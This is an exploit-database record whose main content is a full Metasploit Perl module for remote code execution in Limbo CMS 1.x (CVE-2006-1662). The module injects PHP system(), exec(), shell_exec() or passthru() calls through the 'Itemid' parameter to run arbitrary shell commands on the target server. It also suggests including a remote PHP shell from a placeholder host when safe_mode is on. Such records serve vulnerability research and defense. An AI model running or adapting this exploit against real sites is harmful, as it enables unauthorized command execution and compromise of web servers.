{
  "id": "1563",
  "title": "Limbo CMS 1.0.4.2 - &#039;itemID&#039; Remote Code Execution (Metasploit)",
  "cve": "CVE-2006-1662",
  "vuln_type": "rce",
  "code": "##\r\n#      Title: Limbo CMS version 1.x suffers from a remote code execution vulnerability. \r\n#    Name: limbo_cms_1_x.pm\r\n# License: Artistic/BSD/GPL\r\n#         Info: Trying to get the command execution exploits out of the way on milw0rm.com. M's are always good.\r\n#\r\n#\r\n#  - This is an exploit module for the Metasploit Framework, please see\r\n#     http://metasploit.com/projects/Framework for more information.\r\n##\r\n\r\npackage Msf::Exploit::limbo_cms_1_x;\r\nuse base \"Msf::Exploit\";\r\nuse strict;\r\nuse Pex::Text;\r\nuse bytes;\r\n\r\nmy $advanced = { };\r\n\r\nmy $info = {\r\n\t'Name'     => 'Limbo CMS version 1.x Code Execution',\r\n\t'Version'  => '$Revision: 1.1 $',\r\n\t'Authors'  => [ 'sirh0t < sirh0t [at] hotmail.com >' ],\r\n\t'Arch'     => [ ],\r\n\t'OS'       => [ ],\r\n\t'Priv'     => 0,\r\n\t'UserOpts' =>\r\n\t  {\r\n\t\t'RHOST' => [1, 'ADDR', 'The target address'],\r\n\t\t'VHOST' => [0, 'DATA', 'The virtual host name of the server'],\r\n\t\t'RPORT' => [1, 'PORT', 'The target port', 80],\r\n\t\t'RPATH' => [1, 'DATA', 'Path to the index.php script', ' /limbo/index.php'],\r\n\t\t'SSL'   => [0, 'BOOL', 'Use SSL'],\r\n\t  },\r\n\r\n\t'Description' => Pex::Text::Freeform(qq{\r\n\t\t\tThis module exploits an arbitrary PHP code execution flaw in the Limbo version 1.*. All versions UNPATCHED Limbo 1.x are affected. Bug found by Aleksander Hristov\r\n}),\r\n#milw0rm this is your part ;p\r\n\t'Refs' =>\r\n\t  [\r\n\t\t['OSVDB', '-----'],\r\n\t\t['CVE',   '---------'],\r\n\t\t['MIL',   '125'],\r\n\t  ],\r\n\r\n\t'Payload' =>\r\n\t  {\r\n\t\t'Space' => 512,\r\n\t\t'Keys'     => ['cmd', 'cmd_bash'],\r\n\t  },\r\n\r\n\t'DefaultTarget' => 1,\r\n\t'Targets' =>\r\n\t  [\r\n\t\t['Vulnerably test',0],\r\n\t\t['use system()', 1],\r\n\t\t['use exec()', 2],\r\n\t\t['use shell_exec()',3],\r\n\t\t['use passthru()',4],\r\n\t  ],\r\n\r\n\r\n\t'Keys' => ['limbo'],\r\n\r\n\t'DisclosureDate' => 'Mar 03 2006',\r\n  };\r\n\r\nsub new {\r\n\tmy $class = shift;\r\n\tmy $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);\r\n\treturn($self);\r\n}\r\n\r\nsub Exploit {\r\n\tmy $self = shift;\r\n\tmy $target_host    = $self->GetVar('RHOST');\r\n\tmy $vhost          = $self->GetVar('VHOST') || $target_host;\r\n\tmy $target_port = $self->GetVar('RPORT');\r\n\tmy $target_idx  = $self->GetVar('TARGET');\r\n\tmy $target      = $self->Targets->[$target_idx];\r\n\tmy $path           = $self->GetVar('RPATH');\r\n\tmy $cmd            = $self->GetVar('EncodedPayload')->RawPayload;\r\n\tmy ($data);\r\n\r\n\t# Add an echo on each end for easy output capturing\r\n\t$cmd = \"echo _cmd_beg_;\".$cmd.\";echo _cmd_end_\";\r\n\r\n\t# Replacing all spaces with %20\r\n\t$cmd =~ s/ /%20/g;\r\n\r\n\t# Create the get request data\r\n\tif ($target_idx == 0) {\r\n\t\t$data = \"?option=frontpage&Itemid=phpinfo()\";\r\n\t} elsif($target_idx == 1) {\r\n\t\t$data = \"?option=frontpage&Itemid=system(\\$_GET[m])&m=$cmd\";\r\n\t} elsif($target_idx == 2) {\r\n\t\t$data = \"?option=frontpage&Itemid=exec(\\$_GET[m])&m=$cmd\";\r\n\t} elsif($target_idx == 3) {\r\n\t\t$data = \"?option=frontpage&Itemid=shell_exec(\\$_GET[m])&m=$cmd\";\r\n\t} elsif($target_idx == 4) {\r\n\t\t$data = \"?option=frontpage&Itemid=passthru(\\$_GET[m])&m=$cmd\";\r\n\t}\r\n\r\n\tmy $req =\r\n\t  \"GET $path$data HTTP/1.1\\r\\n\".\r\n\t  \"Accept: */*\\r\\n\".\r\n\t  \"User-Agent: Mozilla/4.0 (MetaSploit)\\r\\n\".\r\n\t  \"Host: $vhost\\r\\n\".\r\n\t  \"Connection: Close\\r\\n\".\r\n\t  \"\\r\\n\";\r\n\r\n\tmy $s = Msf::Socket::Tcp->new(\r\n\t\t'PeerAddr'  => $target_host,\r\n\t\t'PeerPort'  => $target_port,\r\n\t\t'SSL'       => $self->GetVar('SSL'),\r\n\t  );\r\n\r\n\tif ($s->IsError){\r\n\t\t$self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n\t\treturn;\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Sending the malicious Limbo request...\");\r\n\r\n\t$s->Send($req);\r\n\tmy $results = $s->Recv(-1, 20);\r\n\t$s->Close();\r\n\r\n\tif ($target_idx == 0) {\r\n\tif ($results =~ /disable_functions/) {\r\n\t\t$self->PrintLine(\"[*] Server is vuln!\");\r\n\t\tif ($results =~ /system()/) {\r\n\t\t\t$self->PrintLine(\"[?] system() is disabled\");\r\n\t\t}\r\n\t\tif ($results =~ /shell_exec()/) {\r\n\t\t\t$self->PrintLine(\"[?] shell_exec() is disabled\");\r\n\t\t}\r\n\t\tif ($results =~ /passthru()/) {\r\n\t\t\t$self->PrintLine(\"[?] shell_exec() is disabled\");\r\n\t\t}\r\n\t\tif ($results =~ /exec()/) {\r\n\t\t\t$self->PrintLine(\"[?] exec() is disabled\");\r\n\t\t}\r\n\t\t\t$self->PrintLine(\"[*] If safe_mode=on try $vhost$path?option=frontpage&Itemid=include(\\$_GET[m])&m=http://PHPSHELL?&\");\r\n\r\n\t} else {\r\n\t \t$self->PrintLine(\"[-] Server NOT vuln!\");\r\n\t} \r\n\t} elsif ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {\r\n\t\tmy $out = $1;\r\n\t\t$out =~ s/^\\s+|\\s+$//gs;\r\n\t\tif ($out) {\r\n\t\t\t$self->PrintLine('----------------------------------------');\r\n\t\t\t$self->PrintLine('');\r\n\t\t\t$self->PrintLine($out);\r\n\t\t\t$self->PrintLine('');\r\n\t\t\t$self->PrintLine('----------------------------------------');\r\n\t\t}\r\n\t} else {\r\n\t\t$self->PrintLine('[-] exploit failed');\r\n\t}\r\n\r\n\treturn;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2006-03-07]",
  "url": "https://www.exploit-db.com/exploits/1563"
}